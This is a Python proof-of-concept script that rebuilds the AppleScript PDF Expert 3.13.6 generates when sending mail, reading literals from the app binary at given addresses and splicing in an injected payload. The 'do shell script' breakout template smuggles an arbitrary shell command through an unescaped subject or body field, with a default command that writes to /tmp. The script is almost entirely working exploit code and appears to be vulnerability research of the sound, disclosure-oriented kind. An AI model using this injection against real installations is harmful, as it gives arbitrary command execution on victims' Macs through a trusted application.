#!/usr/bin/env python3
"""Rebuild the AppleScript program PDF Expert 3.13.6 (1187) generates in
-sendMailViaAppleScriptWith(mailInfo:exportInfo:), with an injected payload.

The literals are READ OUT OF THE SHIPPED BINARY at run time, by virtual address,
so nothing here is a transcription. Pass --binary to point at the executable:

    python3 gen_poc.py --binary "/Applications/PDF Expert.app/Contents/MacOS/PDF Expert"

Append order, from the disassembly (app arm64; file_offset = slice_base + (vaddr - 0x100000000)):

  0x10057dba4  L(0x100dc6db0)  'tell application "Mail"\\nset theTos to {'
               <tos values, each wrapped by the app in a bare quote>
  0x10057dbd0  L(0x100dc6de0)  '}\\nset theCcs to {'
               <ccs values>
  0x10057dbf8  L(0x100dc6e00)  '}\\nset theBccs to {'
               <bccs values>
  0x10057dc20  L(0x100dc6e20)  '}\\nset theAttachments to {'
               <attachment paths>
  0x10057dc6c  L(0x100dc6e40)  '}\\nset newMessage to make new outgoing message with properties {'
  0x10057d6dc  inline key 'subject:'   + bare quote + value + bare quote
  0x10057d784  inline key 'content:'   + bare quote + value
  0x10057d7a4  L(0x100dc71a0)  '" & linefeed & linefeed'
  0x10057dcb0  L(0x100dc6e80)  '}\\ntell newMessage ... set color of words to {'
  0x10057dd2c  L(0x100dc7060)  '}\\n    repeat with theAttachment ...'

No escaping exists on the path: quotedFormOfStringValue, appleScriptEscape and
escapeAppleScript are 0 hits in the executable and in RDPDFKitCore, and the two
replacingOccurrences sites sit at 0x10123a658 / 0x10123a6e0, far outside the function.
"""
import argparse
import struct
import sys

VADDRS = {
    'tos': 0x100dc6db0,
    'ccs': 0x100dc6de0,
    'bccs': 0x100dc6e00,
    'att': 0x100dc6e20,
    'newmsg': 0x100dc6e40,
    'tail1': 0x100dc6e80,
    'tail2': 0x100dc7060,
    'concat': 0x100dc71a0,
}
SLIDE = 0x100000000

INJECT = 'x" & do shell script "%s" & "'


def slice_base(data: bytes) -> int:
    magic = struct.unpack('>I', data[:4])[0]
    if magic not in (0xcafebabe, 0xbebafeca):
        return 0
    n = struct.unpack('>I', data[4:8])[0]
    for i in range(n):
        cpu = struct.unpack('>I', data[8 + i * 20:12 + i * 20])[0]
        off = struct.unpack('>I', data[8 + i * 20 + 8:12 + i * 20 + 8])[0]
        if cpu == 0x0100000C:
            return off
    raise SystemExit('no arm64 slice')


class Binary:
    def __init__(self, path: str):
        self.data = open(path, 'rb').read()
        self.base = slice_base(self.data)

    def cstr(self, vaddr: int) -> str:
        off = self.base + (vaddr - SLIDE)
        end = self.data.index(b'\0', off)
        return self.data[off:end].decode('latin1')


def quoted(v: str) -> str:
    """The app writes a LEADING bare quote and, for the record keys, a TRAILING one."""
    return '"' + v + '"'


def build(binary: Binary, cmd: str, inject_into: str = 'body') -> str:
    L = {k: binary.cstr(v) for k, v in VADDRS.items()}
    payload = INJECT % cmd
    subject = quoted(payload if inject_into == 'subject' else 'Invoice')
    # The body gets a LEADING quote only: the concat literal at 0x100dc71a0
    # ('" & linefeed & linefeed') supplies the closing quote. Wrapping the body in
    # two quotes emits one extra `"` and the script fails to compile with
    # "Expected , or } but found end of line" — measured on a macOS runner.
    body = '"' + (payload if inject_into == 'body' else 'See attached.')
    # No newline may sit between a value and its closing '}': every close-brace
    # literal starts with '}', so the value must be emitted directly against it.
    # Measured on run 44786196996: a '\n' after the tos value fails osacompile
    # with "generated.scpt:2: Expected , or } but found end of line (-2741)".
    return ''.join([
        L['tos'], quoted('test@example.com'),
        L['ccs'], quoted(''),
        L['bccs'], quoted(''),
        L['att'], quoted('/tmp/report.pdf'),
        L['newmsg'],
        'subject:', subject, ', ',
        'content:', body,
        L['concat'],
        L['tail1'],
        L['tail2'],
    ])


if __name__ == '__main__':
    ap = argparse.ArgumentParser()
    ap.add_argument('--binary', required=True,
                    help='path to the PDF Expert executable (arm64 slice is used)')
    ap.add_argument('--cmd', default='id > /tmp/pdfe_pwned')
    ap.add_argument('--field', choices=['body', 'subject'], default='body')
    a = ap.parse_args()
    print(build(Binary(a.binary), a.cmd, a.field))
